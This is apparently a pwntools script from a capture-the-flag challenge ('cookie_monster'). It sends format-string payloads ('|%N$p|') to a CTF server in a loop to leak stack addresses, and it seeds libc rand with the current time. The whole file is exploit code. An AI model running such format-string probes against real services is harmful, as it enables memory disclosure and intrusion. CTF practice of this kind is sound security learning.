from pwn import *
from ctypes import CDLL
from time import *
libc = CDLL('libc.so.6')
now = int(time())
libc.srand(now)

#p=process("./cookie_monster")

for num in range(1,20):
	p=remote('ctf.umbccd.io', 4200)
	payload = "|%"+str(num)+"$p|"
	p.sendlineafter('Oh hello there, what\'s your name?\n',payload)
	stack =  p.recvline().split('|')[1]
	if stack == "(nil)":
		continue;
	addr = int(stack,16)
	print "leaked addr"+str(num)+": "+hex(addr)
	p.close()
	p.shutdown()